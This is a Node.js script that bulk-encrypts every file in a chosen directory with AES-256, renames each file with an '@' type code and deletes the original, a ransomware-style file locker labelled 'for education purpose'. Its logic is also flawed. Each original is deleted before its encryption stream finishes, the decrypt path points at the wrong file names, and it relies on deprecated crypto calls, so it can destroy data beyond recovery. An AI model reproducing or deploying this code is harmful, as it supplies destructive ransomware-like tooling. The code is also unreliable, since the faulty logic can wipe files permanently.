const readline = require('node:readline');
const crypto = require('crypto');
const fs = require('fs');
//const process = require('process')

var Noted = `Noted: This method using for education purpose! \nbe aware to make some with this dangerous source code!\nThanks you.`
// Function to encrypt a file
function encryptFile(inputFilePath, outputFilePath, key) {
    const cipher = crypto.createCipher('aes-256-cbc', key);
    const input = fs.createReadStream(inputFilePath);
    const output = fs.createWriteStream(outputFilePath);
    input.pipe(cipher).pipe(output);
    output.on('finish', () => {
        //console.log(`File ${inputFilePath} encrypted successfully.`);
    });
}
// Function to decrypt a file
function decryptFile(inputFilePath, outputFilePath, key) {
    const decipher = crypto.createDecipher('aes-256-cbc', key);
    const input = fs.createReadStream(inputFilePath);
    const output = fs.createWriteStream(outputFilePath);
    input.pipe(decipher).pipe(output);
    output.on('finish', () => {
        //console.log('File decrypted successfully.');
    });
}
function getFileExtension(filename) {
    var ext = /^.+\.([^.]+)$/.exec(filename);
    return ext == null ? "" : ext[1];
}
function typeFile(checkdotfile) {
    const fileTypes = {
        'txt': 1, 'docx': 2, 'pdf': 3, 'png': 4, 'jpg': 5, 'gif': 6,
        'xlsx': 7, 'pptx': 8, 'csv': 9, 'json': 10, 'xml': 11, 'html': 12,
        'css': 13, 'js': 14, 'mp3': 15, 'mp4': 16, 'avi': 17, 'mkv': 18,
        'xls': 19, 'zip': 20, 'sql': 21, 'apk': 22, 'rar': 23
    };
    return fileTypes[checkdotfile] || 0;
}
function getFileTypeByNumber(file) {
    const dotIndex = file.indexOf('@') + 1;
    const result = dotIndex !== -1 ? file.substring(dotIndex) : file;
    const fileTypes = {
        '1': 'txt', '2': 'docx', '3': 'pdf', '4': 'png', '5': 'jpg',
        '6': 'gif', '7': 'xlsx', '8': 'pptx', '9': 'csv', '10': 'json',
        '11': 'xml', '12': 'html', '13': 'css', '14': 'js', '15': 'mp3',
        '16': 'mp4', '17': 'avi', '18': 'mkv', '19': 'xls', '20': 'zip',
        '21': 'sql', '22': 'apk', '23': 'rar'
    };
    return fileTypes[result] || '';
}
const rl = readline.createInterface
    ({
        input: process.stdin,
        output: process.stdout,
    });
//#region 
rl.question('Select path files: ', dirPath => {
    rl.question('Select type (1.encrypt /2.decrypt): ', type => {
        rl.question('Secret Key For Encrypt: ', key => {
            fs.readdirSync(dirPath).forEach(file => {
                const inputFilePath = `${dirPath}/${file}`;
                //return number base on file type (txt = 1)
                const checkDotFile = getFileExtension(file);

                //return file type (Ex: txt, docx)
                const findTypeFile = typeFile(checkDotFile)

                //cut string start from dot file => return while file
                const dotIndex = file.indexOf('.');
                const result = dotIndex !== -1 ? file.substring(0, dotIndex) : file;

                //path folder for target folder
                const outputFilePath = `${dirPath}/${result}`;
                const dotFIle = getFileTypeByNumber(result);
                if (type == 1) {
                    encryptFile(inputFilePath, outputFilePath + '@' + findTypeFile, key);
                    fs.rm(`${dirPath}/${file}`, function () {
                        console.log('======================================================')
                        console.log(`file => ${file} has been encrypted!`)
                        console.log('======================================================')
                    });
                } else if (type == 2) {
                    var startChar = '@';
                    var test1 = inputFilePath.substring(0, inputFilePath.indexOf(startChar));
                    decryptFile(outputFilePath, test1 + '.' + dotFIle, key);
                    fs.rm(outputFilePath, function () {
                        console.log('======================================================')
                        console.log(`file => ${file} has been decrypted!`)
                        console.log('======================================================')
                    });
                } else {
                    console.log('Invalid type selected.');
                }
                rl.close();
            });
        })
    });
});
//#endregion